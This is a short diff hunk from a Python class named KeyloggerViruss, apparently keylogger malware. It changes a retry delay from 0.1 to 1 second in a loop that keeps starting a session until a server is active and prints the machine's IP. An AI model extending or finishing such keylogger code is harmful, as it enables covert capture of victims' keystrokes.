@@ -137,4 +137,4 @@ class KeyloggerViruss():
         while not self.is_active_server:
             self.start_session()
             print(self.ip_self)
-            time.sleep(0.1)
+            time.sleep(1)
